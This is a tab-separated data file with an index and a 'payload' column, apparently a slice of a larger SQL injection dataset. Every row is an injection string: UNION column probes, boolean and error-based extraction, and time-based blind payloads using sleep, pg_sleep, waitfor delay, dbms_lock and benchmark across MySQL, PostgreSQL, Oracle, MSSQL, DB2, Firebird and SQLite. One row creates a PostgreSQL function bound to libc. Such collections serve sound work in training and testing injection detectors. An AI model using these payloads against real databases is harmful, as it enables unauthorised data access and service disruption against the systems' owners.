Unnamed: 0	payload
14791	-9176')) as eunw where 5978=5978 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#
14792	-8625 or 3176=2519# fvgl
14793	-4761 order by 1--
14794	1%' or 8156=(select count(*) from generate_series(1,5000000))--
14795	1')));begin dbms_lock.sleep(5); end and ((('xzbk'='xzbk
14796	1'||(select 'xemx' from dual where 4683=4683 or sleep(5)#
14797	"1"")) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((""isbh"" like ""isbh"
14798	1))) and 8407=(select count(*) from generate_series(1,5000000)) and (((1729=1729
14799	1)) or (select * from (select(sleep(5)))sddo)#
14800	1)) as mmby where 3990=3990 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--
14801	-1558 or elt(3306=2272,2272)-- ioxt
14802	1')) as omwk where 1414=1414 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--
14803	-3758')) union all select 9460,9460,9460,9460,9460,9460,9460,9460--
14804	1'))) and sleep(5) and ((('vbck' like 'vbck
14805	1'+(select byor where 4538=4538;call regexp_substring(repeat(right(char(3702),0),500000000),null))+'
14806	"-9891"" union all select 7489#"
14807	"1%"")) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((""%""="""
14808	"1%""));select like('abcdefg',upper(hex(randomblob(500000000/2))))--"
14809	"1"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx"
14810	-1700%' or 4149=3391#
14811	1'||(select 'iwlj' where 8704=8704 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))||'
14812	"1"") where 1416=1416 union all select null,null,null#"
14813	1';select pg_sleep(5) and 'zfyy'='zfyy
14814	"1"") as frmp where 6073=6073;select (case when (8689=2468) then 8689 else 1/(select 0) end)--"
14815	"-2321%"") or 2271=7683--"
14816	"1%"" union all select null,null,null,null#"
14817	1')) as jxvv where 6593=6593 or elt(6272=6272,sleep(5))--
14818	"1%"")) union all select null,null,null,null,null--"
14819	-4384'))) or 6872=6872 and ((('ukhl'='ukhl
14820	1);call regexp_substring(repeat(right(char(3702),0),500000000),null)
14821	-1886' where 5518=5518 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--
14822	"-4588"" union all select 4550,4550,4550,4550#"
14823	1) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)
14824	-6512'+(select 'zdjx' where 5454=5454 order by 1--
14825	1));iif(5257=5257,1,1/0)
14826	"1%""))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--"
14827	1')) as uvxv where 6663=6663 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
14828	"-2168"")) union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935--"
14829	-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--
14830	1))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
14831	1%'))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--
14832	"1%"") procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (""%""="""
14833	"1%"") and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--"
14834	1')) as cjjm where 1981=1981;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--
14835	1)) as cdhd where 2958=2958 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
14836	"-7813"")) as yvyl where 5172=5172 union all select 5172,5172#"
14837	1')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('weof'='weof
14838	1' where 6583=6583;select case when 4537=8418 then 1 else null end--
14839	1')) rlike (select * from (select(sleep(5)))sgvo) and (('krvo' like 'krvo
14840	1') where 9175=9175;select case when 7634=3954 then 1 else null end--
14841	-7845' union all select 9574,9574,9574,9574,9574,9574#
14842	"-1254"" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)"
14843	1) and 2457=8146
14844	1'||(select 'omeg' from dual where 4751=4751;select pg_sleep(5))||'
14845	-9148) where 2027=2027 or 8571=8571--
14846	1' in boolean mode) and elt(4249=4249,7259)#
14847	-5911 union all select 2245,2245,2245,2245,2245,2245#
14848	-5067')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('vkab' like 'vkab
14849	1) as nlig where 5964=5964 and 2388=benchmark(5000000,md5(0x6d457153))#
14850	1))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (((7484=7484
14851	"1""))) and sleep(5) and (((""bvgg""=""bvgg"
14852	1') as sagj where 4558=4558;select count(*) from generate_series(1,5000000)--
14853	"1%""))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((""%""="""
14854	"1"") as hoiv where 9708=9708 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--"
14855	-6680') or 5483=3031 and ('zxes'='zxes
14856	"-8043%""))) or make_set(9354=9354,7185) and (((""%""="""
14857	1'));waitfor delay '0:0:5' and (('nvqf'='nvqf
14858	"1"" and elt(4249=4249,7259) and ""kgtz"" like ""kgtz"
14859	"-9062"" or 6872=6872 and ""aumq"" like ""aumq"
14860	"-1196"")) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""srlq""=""srlq"
14861	1%' or sleep(5) and '%'='
14862	1)) as zoso where 3633=3633;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--
14863	"-9661""))) union all select 2158,2158,2158--"
14864	"1"")));(select * from (select(sleep(5)))acdk)#"
14865	1'||(select 'bccx' where 5881=5881 and elt(1210=1210,sleep(5)))||'
14866	1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('mseo' like 'mseo
14867	"1"")) union all select null,null,null#"
14868	1 where 8948=8948 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--
14869	-2316'))) or 8519=6010
14870	1' and 9198=9198--
14871	1,(select * from generate_series(5609,5609,case when (5609=5609) then 1 else 0 end) limit 1)
14872	1%' and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
14873	1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'foju'='foju
14874	"1""));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--"
14875	"1%""))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""%""="""
14876	1' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and 'gbpg'='gbpg
14877	-8760) where 8277=8277 union all select 8277--
14878	"1%"")));select count(*) from generate_series(1,5000000)--"
14879	-8200' where 3422=3422 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
14880	1))) union all select null,null,null,null,null,null,null,null,null,null#
14881	"1%"")));waitfor delay '0:0:5' and (((""%""="""
14882	"-7806"")) or (8459=8459)*4906 and ((""vlrj"" like ""vlrj"
14883	"1""));select (case when (4690=4373) then 4690 else 1/(select 0) end)--"
14884	1 where 6304=6304;begin dbms_lock.sleep(5); end--
14885	1'||(select 'dujx' where 6896=6896 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
14886	1) as hlit where 4973=4973 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#
14887	-4285'))) union all select 8819,8819,8819,8819,8819,8819,8819,8819#
14888	1%') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('%'='
14889	1%'))) union all select null,null,null,null,null,null--
14890	"-3913"" where 6085=6085 union all select 6085,6085,6085,6085,6085,6085,6085#"
14891	1')) as kxek where 3429=3429 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--
14892	-2022))) or 6812=3516 and (((3896=3896
14893	-6580') union all select 9950,9950,9950,9950,9950,9950--
14894	1'||(select 'wtdz' from dual where 1866=1866 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
14895	1%' and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and '%'='
14896	1',(select (case when (5586=6403) then 1 else 5586*(select 5586 from mysql.db) end))
14897	"1%"") or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""%""="""
14898	"1"" where 5845=5845 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--"
14899	"-2860"")) order by 1#"
14900	-7802'))) or elt(8778=9974,9974) and ((('glsq' like 'glsq
14901	1'+(select 'midn' where 2819=2819 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))+'
14902	"-9318""))) union all select 5223,5223,5223,5223#"
14903	1')));waitfor delay '0:0:5' and ((('ozjl' like 'ozjl
14904	1%' waitfor delay '0:0:5'--
14905	1';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'ekhi'='ekhi
14906	1'))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--
14907	1')) union all select null--
14908	1' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
14909	"1""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""nthu"" like ""nthu"
14910	1') as gsjr where 7046=7046 and sleep(5)#
14911	"-1908"")) union all select 4072,4072,4072,4072,4072,4072,4072,4072,4072,4072#"
14912	-2745' or elt(1032=1032,3623)
14913	"1"" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)"
14914	"-3827"") or 8571=8571--"
14915	1' where 7080=7080 or 8514=benchmark(5000000,md5(0x544d5a4c))#
14916	-7746') union all select 1998,1998,1998,1998,1998,1998,1998,1998#
14917	1',(select (case when (1609=1609) then waitfor delay '0:0:5' else 1609*(select 1609 from master..sysdatabases) end))
14918	"1"")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""fuus"" like ""fuus"
14919	-8409%') or make_set(9354=9354,7185) and ('%'='
14920	-2348) as sige where 1639=1639 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--
14921	1'||(select 'sdll' where 5074=5074 or (select * from (select(sleep(5)))ydpu))||'
14922	1')));select count(*) from generate_series(1,5000000) and ((('ldqq'='ldqq
14923	1'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('yznn' like 'yznn
14924	"-7235"") union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#"
14925	"1%"" and 1343=5939#"
14926	"1"") as vcir where 6275=6275 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--"
14927	"1%"") and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--"
14928	1) and elt(3114=3114,sleep(5))#
14929	1') where 4500=4500;iif(5257=5257,1,1/0)
14930	"1%"")) rlike (select * from (select(sleep(5)))sgvo) and ((""%""="""
14931	"1"")));select count(*) from generate_series(1,5000000) and (((""uydm""=""uydm"
14932	"1"");select (case when (4043=5276) then 4043 else 4043*(select 4043 from information_schema.character_sets) end)#"
14933	"1"")) as aamh where 7432=7432 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--"
14934	1) where 9206=9206 union all select null,null,null,null,null,null#
14935	1' in boolean mode) and 4457=3885#
14936	1);create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)
14937	-8045))) order by 1--
14938	"-7233"") where 7574=7574 or 5821=3288"
14939	1%') or 8514=benchmark(5000000,md5(0x544d5a4c))#
14940	-3283) where 1948=1948 union all select 1948,1948,1948#
14941	(case when 8422=8452 then 1 else null end)
14942	1';select case when 7426=6635 then 1 else null end--
14943	1')) as fjbe where 4662=4662 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
14944	"1%"")) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--"
14945	"1%"") rlike (select * from (select(sleep(5)))vwyq)#"
14946	1%') and (3020=3020)*6703 and ('%'='
14947	-9484' or (7129=2349)*2349 and 'fcsa' like 'fcsa
14948	-6500')) or (8459=8459)*4906 and (('padu' like 'padu
14949	1 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)# dbzk
14950	"1%"")));begin dbms_lock.sleep(5); end--"
14951	1)) as sfan where 7176=7176 and 7017=7358
14952	1'||(select 'gopc' where 7386=7386 and make_set(9375=7963,7963))||'
14953	1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('izyf'='izyf
14954	-3497' order by 1#
14955	1 where 8389=8389 union all select null,null,null,null,null,null,null,null,null,null#
14956	"-9136%"") union all select 3081,3081,3081,3081,3081,3081,3081#"
14957	"1"" where 3329=3329 or sleep(5)--"
14958	1);call regexp_substring(repeat(right(char(3702),0),500000000),null) and (9646=9646
14959	1' in boolean mode);select like('abcdefg',upper(hex(randomblob(500000000/2))))--
14960	1) where 9432=9432 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
14961	1)));select sleep(5)#
14962	"1"")) as ngvf where 9912=9912 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--"
14963	1' or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
14964	1)) as wufr where 5239=5239 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
14965	1%'));begin user_lock.sleep(5); end and (('%'='
14966	1')) as ezpq where 2976=2976 union all select null,null,null,null,null,null,null,null,null,null#
14967	"-1475"") union all select 8611,8611,8611#"
14968	1) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#
14969	-2102' where 3644=3644 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--
14970	1' waitfor delay '0:0:5' and 'jree'='jree
14971	1) as ywrn where 1893=1893;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#
14972	1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'nelb'='nelb
